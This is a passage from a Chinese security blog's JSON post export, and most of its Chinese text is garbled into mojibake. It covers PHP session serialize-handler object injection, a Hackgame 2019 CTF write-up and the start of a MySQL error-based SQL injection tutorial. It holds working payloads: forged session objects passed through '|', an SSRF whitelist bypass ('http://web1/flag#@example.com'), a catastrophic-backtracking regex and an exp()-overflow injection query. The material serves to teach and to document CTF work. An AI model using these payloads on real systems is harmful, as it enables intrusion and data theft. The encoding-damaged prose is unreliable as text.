ç§å¼•æ“ï¼Œä¸åŒå¼•æ“å­˜å‚¨æ–¹å¼ä¸åŒ: php_binaryï¼š é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ï¼‹é”®åï¼‹ç»è¿‡serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ phpï¼š é”®åï¼‹ç«–çº¿ï¼‹ç»è¿‡serialize()å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_serializeï¼š serialize()å‡½æ•°ååºåˆ—å¤„ç†æ•°ç»„æ–¹å¼ å­˜å‚¨æœºåˆ¶phpä¸­çš„sessionå†…å®¹æ˜¯ä»¥æ–‡ä»¶æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œç”±session.save_handleræ¥å†³å®šã€‚æ–‡ä»¶åç”±sess_+sessionidå‘½åï¼Œæ–‡ä»¶å†…å®¹åˆ™ä¸ºsessionåºåˆ—åŒ–åçš„å€¼ã€‚ è€Œè¿™ä¸ªsessionidæ˜¯å¯ä»¥åœ¨æµè§ˆå™¨é‡ŒæŸ¥å‡ºæ¥çš„ æ¥æµ‹è¯•ä¸€ä¸ªdemo 123456&lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); session_start(); $_SESSION[&#39;name&#39;] &#x3D; &#39;twosmi1e&#39;;?&gt; è¿è¡Œååœ¨é…ç½®æ–‡ä»¶è®¾å®šçš„è·¯å¾„ä¸­ä¼šç”Ÿæˆä¸€ä¸ªsessionæ–‡ä»¶ï¼Œå…¶å†…å®¹ä¸º a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;twosmi1e&quot;;&#125; æ”¹å˜session.save_handlerå‘ç°ï¼š éšç€å­˜å‚¨å¼•æ“å˜åŒ–ï¼Œå…¶å†…å®¹çš„æ ¼å¼ä¹Ÿä¼šå˜åŒ– åˆ©ç”¨æ–¹å¼é€šè¿‡ä¸Šé¢å¯¹å­˜å‚¨æ ¼å¼çš„åˆ†æï¼Œå¦‚æœ PHP åœ¨ååºåˆ—åŒ–å­˜å‚¨çš„ $_SESSION æ•°æ®æ—¶çš„ä½¿ç”¨çš„å¤„ç†å™¨å’Œåºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼Œé€šè¿‡ç‰¹æ®Šçš„æ„é€ ï¼Œç”šè‡³å¯ä»¥ä¼ªé€ ä»»æ„æ•°æ®ï¼š $_SESSION[&#39;ryat&#39;] = &#39;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#39;; ä¾‹å¦‚ä¸Šé¢çš„ $_SESSION æ•°æ®ï¼Œåœ¨å­˜å‚¨æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸º php_serializeï¼Œå­˜å‚¨çš„æ ¼å¼å¦‚ä¸‹ï¼š a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125; åœ¨è¯»å–æ•°æ®æ—¶å¦‚æœç”¨çš„ååºåˆ—åŒ–å¤„ç†å™¨ä¸æ˜¯ php_serializeï¼Œè€Œæ˜¯ php çš„è¯ï¼Œé‚£ä¹ˆååºåˆ—åŒ–åçš„æ•°æ®å°†ä¼šå˜æˆï¼š // var_dump($_SESSION); array(1) &#123; [&quot;a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;&quot;]=&gt; object(stdClass)#1 (0) &#123; &#125; &#125; å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡æ³¨å…¥ | å­—ç¬¦ä¼ªé€ äº†å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼ŒæˆåŠŸå®ä¾‹åŒ–äº† stdClass å¯¹è±¡ é‚£ä¹ˆå°±å­˜åœ¨ä¸¤ç§æƒ…å†µï¼š å½“ session.auto_startï¼Off æ—¶ å½“é…ç½®é€‰é¡¹ session.auto_startï¼Offï¼Œå­˜åœ¨ä¸¤ä¸ªè„šæœ¬æ³¨å†Œ Session ä¼šè¯æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ï¼Œå¦‚ä¸‹é¢çš„ä»£ç ï¼š 123456789101112131415161718192021222324&#x2F;&#x2F;foo1.phpini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);session_start();$_SESSION[&#39;ryat&#39;] &#x3D; $_GET[&#39;ryat&#39;];&#x2F;&#x2F;foo2.phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);&#x2F;&#x2F;or session.serialize_handler set to php in php.ini session_start();class ryat &#123; var $hi; function __wakeup() &#123; echo &#39;hi&#39;; &#125; function __destruct() &#123; echo $this-&gt;hi; &#125;&#125; å½“è®¿é—® foo1.php æ—¶ï¼Œæäº¤æ•°æ®å¦‚ä¸‹ï¼š foo1.php?ryat=|O:4:&quot;ryat&quot;:1:&#123;s:2:&quot;hi&quot;;s:4:&quot;ryat&quot;;&#125; è„šæœ¬ä¼šæŒ‰ç…§ php_serialize å¤„ç†å™¨çš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨æ•°æ®ï¼Œè®¿é—® foo2.php æ—¶ï¼Œåˆ™ä¼šæŒ‰ç…§ php å¤„ç†å™¨çš„ååºåˆ—åŒ–æ ¼å¼è¯»å–æ•°æ®ï¼Œè¿™æ—¶å°†ä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼ŒæˆåŠŸå®ä¾‹åŒ–äº† ryat å¯¹è±¡ï¼Œå¹¶å°†ä¼šæ‰§è¡Œç±»ä¸­çš„ __wakeup æ–¹æ³•å’Œ __destruct æ–¹æ³• å½“ session.auto_startï¼On æ—¶ å½“é…ç½®é€‰é¡¹ session.auto_startï¼Onï¼Œä¼šè‡ªåŠ¨æ³¨å†Œ Session ä¼š è¯ï¼Œå› ä¸ºè¯¥è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨è„šæœ¬ä»£ç æ‰§è¡Œå‰ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è®¾å®š çš„åŒ…æ‹¬åºåˆ—åŒ–å¤„ç†å™¨åœ¨å†…çš„ session ç›¸å…³é…é€‰é¡¹çš„è®¾ç½®æ˜¯ä¸èµ· ä½œç”¨çš„ï¼Œå› æ­¤ä¸€äº›éœ€è¦åœ¨è„šæœ¬ä¸­è®¾ç½®åºåˆ—åŒ–å¤„ç†å™¨é…ç½®çš„ç¨‹åº ä¼šåœ¨ session.auto_startï¼On æ—¶ï¼Œé”€æ¯è‡ªåŠ¨ç”Ÿæˆçš„ Session ä¼š è¯ï¼Œç„¶åè®¾ç½®éœ€è¦çš„åºåˆ—åŒ–å¤„ç†å™¨ï¼Œå†è°ƒç”¨ session_start() å‡½ æ•°æ³¨å†Œä¼šè¯ï¼Œè¿™æ—¶å¦‚æœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸ php.ini ä¸­ è®¾ç½®çš„ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜,å¦‚ä¸‹é¢çš„ä»£ç ï¼š 12345678910&#x2F;&#x2F;foo.phpif (ini_get(&#39;session.auto_start&#39;)) &#123; session_destroy();&#125;ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);session_start();$_SESSION[&#39;ryat&#39;] &#x3D; $_GET[&#39;ryat&#39;]; å½“ç¬¬ä¸€æ¬¡è®¿é—®è¯¥è„šæœ¬ï¼Œå¹¶æäº¤æ•°æ®å¦‚ä¸‹ï¼š foo.php?ryat=|O:8:&quot;stdClass&quot;:0:&#123;&#125; è„šæœ¬ä¼šæŒ‰ç…§ php_serialize å¤„ç†å™¨çš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨æ•°æ®ï¼š a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125; å½“ç¬¬äºŒæ¬¡è®¿é—®è¯¥è„šæœ¬æ—¶ï¼ŒPHP ä¼šæŒ‰ç…§ php.ini é‡Œè®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ååºåˆ—åŒ–å­˜å‚¨çš„æ•°æ®ï¼Œè¿™æ—¶å¦‚æœ php.ini é‡Œè®¾ç½®çš„æ˜¯ php å¤„ç†å™¨çš„è¯ï¼Œå°†ä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼ŒæˆåŠŸå®ä¾‹åŒ–äº† stdClass å¯¹è±¡ï¼šï¼‰ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸º PHP è‡ªåŠ¨æ³¨å†Œ Session ä¼šè¯æ˜¯åœ¨è„šæœ¬æ‰§è¡Œå‰ï¼Œæ‰€ä»¥é€šè¿‡è¯¥æ–¹å¼åªèƒ½æ³¨å…¥ PHP çš„å†…ç½®ç±»ã€‚ Jarvisojä¸Šçš„ä¸€é“é¢˜å…·ä½“å‚è€ƒï¼šhttp://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://www.m00nback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"hackgame2019éƒ¨åˆ†é¢˜ç›®writeup","slug":"hackgame-wp","date":"2019-10-26T15:08:20.000Z","updated":"2020-01-16T10:05:26.106Z","comments":true,"path":"2019/10/26/hackgame-wp/","link":"","permalink":"http://www.m00nback.xyz/2019/10/26/hackgame-wp/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†hackgame2019éƒ¨åˆ†é¢˜ç›®çš„writeup!","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†hackgame2019éƒ¨åˆ†é¢˜ç›®çš„writeup! ç™½ä¸å¤œå°†å›¾ç‰‡downä¸‹æ¥ï¼Œç”¨Stegsolveæ‰“å¼€ ä¿¡æ¯å®‰å…¨ 2077æŠ“åˆ°poståŒ…ï¼Œå°†If-Unmodified-Sinceæ”¹æˆ2077ä¹‹å å®‡å®™ç»ˆæé—®é¢˜42Googleä¸€ä¸‹å°±çŸ¥é“äº† 12Give me 3 integers, x, y, and z, such thatx^3 + y^3 + z^3 &#x3D; 42 42 = (-80538738812075974)Â³ + 80435758145817515Â³ + 12602123297335631Â³ Everythingè¿˜æ˜¯Googleä¸€ä¸‹å°±å‡ºæ¥äº† 12Since you already know the Answer to Everything, could you give me 8 integers, a, b, c, d, i, j, k and l, such thata^3 + b^3 + c^3 + d^3 &#x3D; i^2 + j^2 + k^2 + l^2 &#x3D; random_prime(2^256) * random_prime(2^256) &#x3D; 2696202144446753329066703065018205556554521178594549469403210892619232428137856502450273212093761946616284001286324448308517304228289606401398114121525169 ä¸¤ä¸ªæ±‚è§£é¡µé¢ï¼šå››å¹³æ–¹ å››ç«‹æ–¹ Last question12The last question is beyond Everything, but still you can try to solve it, by giving me 2 integers, p and q, such thatp^2 + q^2 &#x3D; randint(2^256) &#x3D; 16803108896636432087843597567919881272571173380668774706039248650282590651651 è¿™é“é¢˜å°±å¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œä¸å¯èƒ½æ‰€æœ‰çš„éšæœºæ•°éƒ½å¯ä»¥è¢«åˆ†æˆ4ä¸ªæ•°çš„å¹³æ–¹ä¹‹å’Œï¼Œæœ‰çš„åªèƒ½åˆ†æˆä¸¤ä¸ª ç½‘é¡µè¯»å–å™¨12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from flask import Flask, render_template, request, send_from_directoryimport requests # well, requests is designed for humans, and I like it.app &#x3D; Flask(__name__)whitelist_hostname &#x3D; [&quot;example.com&quot;, &quot;www.example.com&quot;]whitelist_scheme &#x3D; [&quot;http:&#x2F;&#x2F;&quot;]def check_hostname(url): for i in whitelist_scheme: if url.startswith(i): url &#x3D; url[len(i):] # strip scheme url &#x3D; url[url.find(&quot;@&quot;) + 1:] # strip userinfo## æˆªå–è¦@åé¢çš„ if not url.find(&quot;&#x2F;&quot;) &#x3D;&#x3D; -1: url &#x3D; url[:url.find(&quot;&#x2F;&quot;)] # strip parts after authority## æˆªå–è¦&#x2F;å‰çš„ if not url.find(&quot;:&quot;) &#x3D;&#x3D; -1: url &#x3D; url[:url.find(&quot;:&quot;)] # strip port è¦:å‰çš„ if url not in whitelist_hostname: return (False, &quot;hostname &#123;&#125; not in whitelist&quot;.format(url)) return (True, &quot;ok&quot;) return (False, &quot;scheme not in whitelist, only &#123;&#125; allowed&quot;.format(whitelist_scheme))@app.route(&quot;&#x2F;&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;&#x2F;request&quot;)def req_route(): url &#x3D; request.args.get(&#39;url&#39;) status, msg &#x3D; check_hostname(url) if status is False: # print(msg) return msg try: r &#x3D; requests.get(url, timeout&#x3D;2) if not r.status_code &#x3D;&#x3D; 200: return &quot;We tried accessing your url, but it does not return HTTP 200. Instead, it returns &#123;&#125;.&quot;.format(r.status_code) return r.text except requests.Timeout: return &quot;We tried our best, but it just timeout.&quot; except requests.RequestException: return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;@app.route(&quot;&#x2F;source&quot;)def get_source(): return send_from_directory(&quot;&#x2F;static&#x2F;&quot;, &quot;app.py&quot;, as_attachment&#x3D;True)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(&quot;0.0.0.0&quot;, 8000, debug&#x3D;False) è¿™é“é¢˜ä¸»è¦çš„ç‚¹å°±æ˜¯ URL çš„ parser å’Œ requester çš„ä¸ä¸€è‡´æ€§å¯¼è‡´çš„æ„æ–™ä¹‹å¤–çš„ SSRF é—®é¢˜ å…³äºURI(ç»Ÿä¸€èµ„æºæ ‡å¿—ç¬¦)URLï¼ˆç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰æ˜¯ URI æœ€å¸¸è§çš„ä¸€ç§å½¢å¼ï¼Œè€Œ URL å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ã€Œç½‘å€ã€ URI çš„è¯­æ³•å¤§æ¦‚é•¿æˆä¸‹é¢è¿™ä¸ªæ ·å­ï¼š scheme:[//authority]path[?query][#fragment] å…¶ä¸­ç”¨ [] å›´ä½çš„æ˜¯å¯é€‰çš„ã€‚ç„¶åæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å„éƒ¨åˆ†ï¼š åè®® (scheme)ï¼šè®¿é—®èµ„æºä½¿ç”¨çš„åè®®ï¼Œæ¯”å¦‚è¯´ http, https ä¹‹ç±»çš„ã€‚ æ¥æº (authority)ï¼šæ¥æºä¸­åŒ…å«äº†ä¸»æœºåï¼Œå’Œå¯é€‰çš„ç”¨æˆ·ä¿¡æ¯å’Œç«¯å£å·ï¼Œæ¯”å¦‚ www.ustc.edu.cn, admin:admin@www.example.com:2333ï¼ˆä½¿ç”¨ç”¨æˆ·åä¸º adminï¼Œå¯†ç ä¸º adminï¼Œè®¿é—® www.example.com çš„ 2333 ç«¯å£è·å–èµ„æºï¼‰ã€‚ è·¯å¾„ (path)ï¼šæ¯”å¦‚è¯´ /cgi-bin, /a/b/c/d/e/f/g ç­‰ï¼Œæœ‰ç­‰çº§ (hierarchical) å…³ç³»ã€‚ æŸ¥è¯¢ (query)ï¼šæ²¡æœ‰ç­‰çº§ (non-hierarchical) å…³ç³»çš„æ•°æ®ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒæŸ¥è¯¢ä¸­çš„å‚æ•°ä¼šè¢«ç½‘ç«™çš„åç«¯è·å–åˆ°ï¼Œç„¶åè¿›è¡Œå¯¹åº”çš„å¤„ç†ï¼Œæ¯”å¦‚ ?q=keywordï¼Œ?a=1&amp;b=2ã€‚ ç‰‡æ®µ (fragment)ï¼šæŒ‡å‘ä¸€ä¸ªæ›´ä½çº§åˆ«çš„èµ„æºï¼Œä¾‹å¦‚ #Examplesï¼Œæµè§ˆå™¨è®¿é—®æ—¶ä¼šæ»šåŠ¨åˆ° id ä¸º Examples çš„æ ‡ç­¾ã€‚å¦‚æœå†™è¿‡å•é¡µé¢åº”ç”¨ (SPA) çš„åŒå­¦å¯èƒ½ä¼šçŸ¥é“ï¼Œä¸€äº›æ¡†æ¶å¤„ç†è·¯ç”±æ—¶ä½¿ç”¨ hash æ¨¡å¼ï¼Œè¿™é‡Œçš„ hash å°±æ˜¯ç‰‡æ®µå¼€å¤´çš„ #è§£é¢˜æ–¹æ³• å¦‚æœæˆ‘ä»¬æ„é€ ä¸€ä¸ªå¥‡æ€ªçš„ URL ä¼šæ€ä¹ˆæ ·ï¼Ÿå¦‚æœæˆ‘ä»¬èƒ½æƒ³åŠæ³•è®© check_hostname è§£é‡Šå‡ºä¸»æœºåä¸º example.com çš„åŒæ—¶ï¼Œè®© requests.get() å®é™…è®¿é—®æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œé‚£å°±æˆåŠŸäº†ã€‚ é¢„æœŸè§£å°±ä½¿ç”¨åˆ°äº† fragmentï¼ˆå½“ç„¶ç”¨ ? ä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰ã€‚ç°æœ‰çš„ requester éƒ½ä¼šç›´æ¥å¿½ç•¥æ‰ # åé¢çš„ä¸œè¥¿ï¼Œæ¯•ç«Ÿè¿™å¯¹è¯·æ±‚ç½‘ç«™å†…å®¹æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ä½†è¿™é‡Œçš„ä»£ç æ²¡æœ‰å¯¹ # è¿›è¡Œä»»ä½•å¤„ç†ï¼Œè€Œä¸”ä¼šç²—æš´åœ°å¿½ç•¥æ‰ @ å‰é¢çš„æ‰€æœ‰å†…å®¹ å½“æ—¶åšè¿™é“é¢˜ä¸€ç›´æƒ³çš„æ˜¯ä¸‹é¢è¿™ä¸ªæ€è·¯ï¼Œè¯•äº†å¥½ä¹…æ‰æˆåŠŸ http://www.baidu.com@10.10.10.10ä¸http://10.10.10.10 è¯·æ±‚æ˜¯ç›¸åŒçš„ æ‰€ä»¥è¿™é“é¢˜çš„payload: http://web1/flag#@example.com æˆ– http://web1/flag?@example.com è¾¾æ‹‰å´©å§å¤§å†’é™©è¿™é¢˜æˆ‘ç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„å¯èƒ½æ˜¯æ³¨å…¥ç›¸å…³çš„ä¸œè¥¿ï¼Œå› æ­¤æŠ“åŒ…æ”¹åŒ…ï¼Œæœ€åä¹Ÿæ²¡åšå‡ºæ¥ ä¸€ä¸ªç®€å•çš„æ•´æ•°æº¢å‡ºæ¼æ´è§‚å¯Ÿåˆ° WebSocket çš„ JavaScript ä»£ç ä¸­ï¼Œå‘æœåŠ¡å™¨é€šä¿¡çš„ä»£ç å¦‚ä¸‹ï¼š 1234567$(&quot;#send&quot;).click( function () &#123; let v &#x3D; $(&quot;#input option:selected&quot;).val(); addMsg(&quot;æˆ‘&quot;, opts[parseInt(v)]); ws.send(v) &#125;); åœ¨â€œæ–™ç†å¤§å¸‚åœºâ€ä¹°é¸¡çš„æ—¶å€™ï¼ŒbpæŠ“åŒ…å½“ v = -1900000000000000000 æ—¶å€™ï¼Œåˆ™ä¼šå‘ç”Ÿå¤§æ•´æ•°æº¢å‡ºï¼Œå¹¶ä½¿å¾—è‡ªå·±çš„æ”»å‡»åŠ›æº¢å‡ºï¼Œè€ŒåæŒ‘æˆ˜æ¶é¾™å³å¯ã€‚ è¿™ä¸ªæ˜¯çœŸçš„æƒ³ä¸åˆ°ï¼Œæ‰€ä»¥è¯´ä»¥ååšé¢˜è¿˜è¦æ”¾å¼€æ€ç»´ Happy LUGç›´æ¥ç”¨Chromeæˆ–Firefoxè®¿é—® ğŸ˜‚.hack.ustclug.org ä¼šè‡ªåŠ¨è½¬æˆ xn--g28h.hack.ustclug.org è¿™é‡Œæ˜¯ Unicodeçš„ä¸€ä¸ªåŸŸåç¼–ç æ–¹æ¡ˆ Punycodeï¼ŒğŸ˜‚ä¼šè¢«ç¼–ç æˆ xn--g28h å¦ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯ DNS è®°å½•ã€‚ä¸€ä¸ªåŸŸåé™¤äº†å¯ä»¥æŒ‡å‘ä¸€ä¸ªæˆ–å¤šä¸ª IP åœ°å€ï¼ˆA æˆ– AAAA è®°å½•ï¼‰ä¹‹å¤–è¿˜å¯ä»¥åŒ…å«å…¶ä»–ä¿¡æ¯ï¼Œä¾‹å¦‚æŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼ˆCNAME è®°å½•ï¼‰ï¼ŒæŒ‡ç¤ºæ¥æ”¶é‚®ä»¶çš„æœåŠ¡å™¨ï¼ˆMX è®°å½•ï¼‰ï¼Œæˆ–è€…æä¾›ä»»æ„å­—ç¬¦ä¸²ï¼ˆTXT è®°å½•ï¼‰ç­‰ç­‰ æœ¬é“é¢˜å°±ç”¨äº†åŸŸåæŒ‡å‘å­—ç¬¦ä¸²è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨nslookupæˆ–è€…dig dig TXT xn--g28h.hack.ustclug.org +noidnout nslookup -q=txt xn--g28h.hack.ustclug.org æ­£åˆ™éªŒè¯å™¨è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯æ­£åˆ™å›æº¯çš„çŸ¥è¯†ç‚¹ å¯å‚è§wiki è¿™é‡Œæœ‰ä¸ªæµ‹è¯•æ­£åˆ™çš„å¹³å° è¿™é‡Œè¯´ä¸‹æ­£åˆ™è¡¨è¾¾å¼*?+çš„ç”¨æ³• + å·ä»£è¡¨å‰é¢çš„å­—ç¬¦å¿…é¡»è‡³å°‘å‡ºç°ä¸€æ¬¡ï¼ˆ1æ¬¡æˆ–å¤šæ¬¡ï¼‰ * å·ä»£è¡¨å­—ç¬¦å¯ä»¥ä¸å‡ºç°ï¼Œä¹Ÿå¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–è€…å¤šæ¬¡ï¼ˆ0æ¬¡ã€æˆ–1æ¬¡ã€æˆ–å¤šæ¬¡ï¼‰ ? é—®å·ä»£è¡¨å‰é¢çš„å­—ç¬¦æœ€å¤šåªå¯ä»¥å‡ºç°ä¸€æ¬¡ï¼ˆ0æ¬¡ã€æˆ–1æ¬¡ï¼‰ å¯ä»¥ç›´æ¥åˆ©ç”¨ Regex: (a*)*$ String: aaaaaaaaaaaaaaaaaaaaaaab è¿™ä¸ªæ­£åˆ™ç”±äºå¤±è´¥æ—¶å›æº¯çš„å­˜åœ¨ï¼Œæ¯å¢åŠ ä¸€ä¸ª a å°±ä¼šä½¿åŒ¹é…æ—¶é—´ç¿»ä¸€å€ ä¸‰æ•™å¥‡å¦™å¤œè¿™é¢˜è€ƒå¯Ÿçš„æ˜¯è§†é¢‘æå–ä¸åŒçš„å¸§çš„æ“ä½œ OpenCV æ˜¯ä¸€ä¸ªè®¡ç®—æœºè§†è§‰åº“ã€‚æˆ‘ä»¬è¿™é‡Œä½¿ç”¨ OpenCV çš„ Python æ¥å£ã€‚å…¶å®åªéœ€è¦çŸ¥é“è¿™ä¹ˆå‡ ä¸ª API å°±å¯ä»¥äº†ï¼š file = cv2.VideoCapture(filename): æ‰“å¼€ä¸€ä¸ªè§†é¢‘æ–‡ä»¶ã€‚ file.read() -&gt; ret, frame: è¯»å–è¿™ä¸ªè§†é¢‘æ–‡ä»¶çš„ä¸€å¸§ï¼Œè¿”å›çŠ¶æ€ä¸å¯¹åº”çš„å¸§ã€‚ cv2.absdiff(frame1, frame2): æ¯”è¾ƒä¸¤ä¸ªå¸§ï¼Œè¿”å›ä¸€ä¸ª Arrayã€‚ array.sum(): æ±‚ Array çš„å’Œã€‚æ­¤å¤–ä¸ºäº†æ˜¾ç¤ºå›¾ç‰‡ï¼Œå¯ä»¥ä½¿ç”¨ matplotlibï¼Œfrom matplotlib import pyplot as plt ç„¶å plt.imshow(frame) å’Œ plt.show() å°±è¡Œã€‚å®Œæ•´çš„ä»£ç å¦‚ä¸‹:12345678910111213141516import cv2from matplotlib import pyplot as pltfile &#x3D; cv2.VideoCapture(&quot;output-1.mp4&quot;)ret, preframe &#x3D; file.read()while True: ret, frame &#x3D; file.read() if ret &#x3D;&#x3D; 0: break diff &#x3D; cv2.absdiff(preframe, frame).sum() if diff &gt; 10000: print(&quot;diff: &#123;&#125;&quot;.format(diff)) plt.imshow(frame) plt.show() preframe &#x3D; frame","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"hackgame","slug":"hackgame","permalink":"http://www.m00nback.xyz/tags/hackgame/"}]},{"title":"MysqlæŠ¥é”™æ³¨å…¥å­¦ä¹ ","slug":"mysql-wrong-injection","date":"2019-10-25T11:49:46.000Z","updated":"2020-04-28T07:29:36.667Z","comments":true,"path":"2019/10/25/mysql-wrong-injection/","link":"","permalink":"http://www.m00nback.xyz/2019/10/25/mysql-wrong-injection/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†sqlæ³¨å…¥ä¸­çš„æŠ¥é”™æ³¨å…¥ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†sqlæ³¨å…¥ä¸­çš„æŠ¥é”™æ³¨å…¥ï¼ ä»€ä¹ˆæ˜¯æŠ¥é”™æ³¨å…¥?SQLæŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚ è¿™ç§æ‰‹æ®µåœ¨è”åˆæŸ¥è¯¢å—é™ä¸”èƒ½è¿”å›é”™è¯¯ä¿¡æ¯çš„æƒ…å†µä¸‹æ¯”è¾ƒå¥½ç”¨ï¼Œæ¯•ç«Ÿç”¨ç›²æ³¨çš„è¯æ—¢è€—æ—¶åˆå®¹æ˜“è¢«å°ã€‚ ä¸»è¦åˆ†ä¸ºä¸‹é¢å‡ ç±»ï¼š BigINTæ•°æ®ç±»å‹æº¢å‡º Xpathè¯­æ³•é”™è¯¯ concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤ ç©ºé—´æ•°æ®ç±»å‹å‡½æ•°é”™è¯¯ BigINTæ•°æ®ç±»å‹æº¢å‡ºè¿™é‡Œå¯ä»¥çœ‹åˆ°mysqlæ˜¯æ€ä¹ˆå¤„ç†æ•´å½¢çš„ åœ¨mysql5.5ä¹‹å‰ï¼Œæ•´å½¢æº¢å‡ºæ˜¯ä¸ä¼šæŠ¥é”™çš„ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£è¯´æ˜out-of-range-and-overflowï¼Œåªæœ‰ç‰ˆæœ¬å·å¤§äº5.5.5æ—¶ï¼Œæ‰ä¼šæŠ¥é”™ã€‚è¯•ç€å¯¹æœ€å¤§æ•°åšåŠ æ³•è¿ç®—ï¼Œå¯ä»¥çœ‹åˆ°æŠ¥é”™çš„å…·ä½“æƒ…å†µï¼š æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœä¸€ä¸ªæŸ¥è¯¢æˆåŠŸè¿”å›ï¼Œåˆ™å…¶è¿”å›å€¼ä¸º0ï¼Œè¿›è¡Œé€»è¾‘éè¿ç®—åå¯å¾—1ï¼Œè¿™ä¸ªå€¼æ˜¯å¯ä»¥è¿›è¡Œæ•°å­¦è¿ç®—çš„ï¼š åŒç†ï¼Œåˆ©ç”¨expå‡½æ•°ä¹Ÿä¼šäº§ç”Ÿç±»ä¼¼çš„æº¢å‡ºé”™è¯¯ æ³¨å…¥å§¿åŠ¿ï¼š select exp(~(select*from(select ****)x)); åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œå†ç»“åˆä¹‹å‰è¯´çš„æº¢å‡ºæŠ¥é”™ï¼Œå°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº†ã€‚è¿™é‡Œéœ€è¦è¯´ä¸€ä¸‹ï¼Œç»ç¬”è€…æµ‹è¯•ï¼Œå‘ç°åœ¨mysql5.5.47å¯ä»¥åœ¨æŠ¥é”™ä¸­è¿”å›æŸ¥è¯¢ç»“æœï¼š è€Œåœ¨mysql&gt;5.5.53æ—¶ï¼Œåˆ™ä¸èƒ½è¿”å›æŸ¥è¯¢ç»“æœ æ­¤å¤–ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œåœ¨mysql/my_error.cä¸­å¯ä»¥çœ‹åˆ°ï¼š 123&#x2F;* Max length of a error message. Should bekept in sync with MYSQL_ERRMSG_SIZE. *&#x2F;#define ERRMSGSIZE (512) xpathè¯­æ³•é”™è¯¯ä»mysql5.1.5å¼€å§‹æä¾›ä¸¤ä¸ªXMLæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ï¼Œextractvalueå’Œupdatexmlã€‚ 